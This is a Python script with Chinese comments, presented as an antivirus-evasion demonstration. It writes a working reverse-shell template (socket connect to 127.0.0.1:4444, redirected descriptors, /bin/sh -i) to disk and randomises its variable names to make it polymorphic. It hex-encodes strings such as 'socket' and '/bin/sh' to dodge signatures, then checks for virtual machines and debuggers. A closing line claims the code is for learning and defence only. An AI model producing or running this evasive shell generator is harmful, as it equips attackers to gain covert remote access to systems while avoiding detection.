import os
import hashlib
import random
import string
import time
from datetime import datetime

class AntivirusBypass:
    def __init__(self):
        self.obfuscation_techniques = [
            "字符串加密",
            "代码混淆",
            "动态加载",
            "内存执行",
            "多态变异",
            "反调试技术",
            "反虚拟机技术",
            "行为欺骗"
        ]
    
    def calculate_file_hash(self, file_path):
        """计算文件哈希值"""
        try:
            hasher = hashlib.sha256()
            with open(file_path, 'rb') as f:
                while chunk := f.read(8192):
                    hasher.update(chunk)
            return hasher.hexdigest()
        except Exception as e:
            return f"Error: {str(e)}"
    
    def generate_random_string(self, length=10):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def obfuscate_string(self, original_string):
        """混淆字符串"""
        # 简单的字符串混淆：将字符串转换为十六进制
        obfuscated = ''.join(f'\\x{ord(c):02x}' for c in original_string)
        return obfuscated
    
    def generate_polymorphic_code(self, template):
        """生成多态代码"""
        # 替换模板中的变量为随机值
        polymorphic_code = template
        for i in range(5):
            placeholder = f"{{VAR{i}}}"
            if placeholder in polymorphic_code:
                polymorphic_code = polymorphic_code.replace(placeholder, self.generate_random_string(8))
        return polymorphic_code
    
    def create_mock_malware(self, output_path):
        """创建模拟恶意软件"""
        # 基本的Python反向Shell模板
        shell_template = '''
import socket
import subprocess
import os

# 混淆的变量名
{VAR0} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
{VAR1} = "127.0.0.1"
{VAR2} = 4444

# 连接到攻击者
{VAR0}.connect(({VAR1}, {VAR2}))

# 重定向标准输入输出
os.dup2({VAR0}.fileno(), 0)
os.dup2({VAR0}.fileno(), 1)
os.dup2({VAR0}.fileno(), 2)

# 执行shell
subprocess.call(["/bin/sh", "-i"])
'''
        
        # 生成多态代码
        polymorphic_code = self.generate_polymorphic_code(shell_template)
        
        # 写入文件
        with open(output_path, 'w') as f:
            f.write(polymorphic_code)
        
        print(f"模拟恶意软件已创建: {output_path}")
        return output_path
    
    def apply_obfuscation(self, input_file, output_file):
        """应用混淆技术"""
        try:
            # 读取原始文件
            with open(input_file, 'r') as f:
                content = f.read()
            
            # 应用字符串混淆
            obfuscated_content = content
            
            # 替换常见的敏感字符串
            sensitive_strings = [
                "socket",
                "subprocess",
                "connect",
                "dup2",
                "/bin/sh"
            ]
            
            for string in sensitive_strings:
                if string in obfuscated_content:
                    obfuscated_content = obfuscated_content.replace(string, self.obfuscate_string(string))
            
            # 添加随机注释和空白
            lines = obfuscated_content.split('\n')
            obfuscated_lines = []
            
            for line in lines:
                obfuscated_lines.append(line)
                # 随机添加注释
                if random.random() < 0.3:
                    obfuscated_lines.append(f"# {self.generate_random_string(20)}")
            
            obfuscated_content = '\n'.join(obfuscated_lines)
            
            # 写入混淆后的文件
            with open(output_file, 'w') as f:
                f.write(obfuscated_content)
            
            print(f"混淆后的文件已创建: {output_file}")
            return output_file
        except Exception as e:
            print(f"应用混淆时出错: {str(e)}")
            return None
    
    def detect_virtual_environment(self):
        """检测虚拟环境"""
        print("\n--- 检测虚拟环境 ---")
        
        # 检查常见的虚拟机文件和目录
        vm_files = [
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",  # VMware
            "C:\\Windows\\System32\\drivers\\vmhgfs.sys",  # VMware
            "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",  # VirtualBox
            "/sys/devices/virtual/dmi/id/product_name",  # Linux VM
            "/proc/scsi/scsi"  # Linux VM
        ]
        
        is_vm = False
        for file_path in vm_files:
            if os.path.exists(file_path):
                print(f"检测到虚拟机特征: {file_path}")
                is_vm = True
        
        # 检查系统信息
        try:
            import platform
            system_info = platform.uname()
            print(f"系统信息: {system_info}")
            
            # 检查处理器信息
            if "virtual" in system_info.processor.lower():
                print("检测到虚拟处理器")
                is_vm = True
        except Exception as e:
            print(f"检查系统信息时出错: {str(e)}")
        
        if is_vm:
            print("结论: 运行在虚拟环境中")
        else:
            print("结论: 运行在物理环境中")
        
        return is_vm
    
    def detect_debugger(self):
        """检测调试器"""
        print("\n--- 检测调试器 ---")
        
        # 简单的反调试技术：检查进程名称
        try:
            import psutil
            debugger_processes = ["ollydbg", "ida", "windbg", "gdb", "lldb"]
            
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for debugger in debugger_processes:
                        if debugger in proc_name:
                            print(f"检测到调试器: {proc_name}")
                            return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            print("未检测到调试器")
            return False
        except Exception as e:
            print(f"检测调试器时出错: {str(e)}")
            return False
    
    def demonstrate_antivirus_bypass(self):
        """演示免杀技术"""
        print("=== 免杀技术演示 ===")
        print("====================")
        
        # 1. 显示免杀技术列表
        print("\n1. 免杀技术列表:")
        for i, technique in enumerate(self.obfuscation_techniques, 1):
            print(f"   {i}. {technique}")
        
        # 2. 创建模拟恶意软件
        print("\n2. 创建模拟恶意软件:")
        mock_malware = self.create_mock_malware("mock_malware.py")
        
        # 3. 计算原始文件哈希
        print("\n3. 计算原始文件哈希:")
        original_hash = self.calculate_file_hash(mock_malware)
        print(f"原始文件哈希: {original_hash}")
        
        # 4. 应用混淆技术
        print("\n4. 应用混淆技术:")
        obfuscated_file = self.apply_obfuscation(mock_malware, "obfuscated_malware.py")
        
        # 5. 计算混淆后文件哈希
        if obfuscated_file:
            print("\n5. 计算混淆后文件哈希:")
            obfuscated_hash = self.calculate_file_hash(obfuscated_file)
            print(f"混淆后文件哈希: {obfuscated_hash}")
            print(f"哈希值是否不同: {original_hash != obfuscated_hash}")
        
        # 6. 检测虚拟环境
        print("\n6. 检测虚拟环境:")
        self.detect_virtual_environment()
        
        # 7. 检测调试器
        print("\n7. 检测调试器:")
        self.detect_debugger()
        
        print("\n=== 演示完成 ===")
        print("通过本演示，你了解了免杀技术的基本原理和实现方法。")
        print("请注意：这些技术仅用于学习和防御目的，请勿用于非法活动。")

if __name__ == "__main__":
    bypass = AntivirusBypass()
    bypass.demonstrate_antivirus_bypass()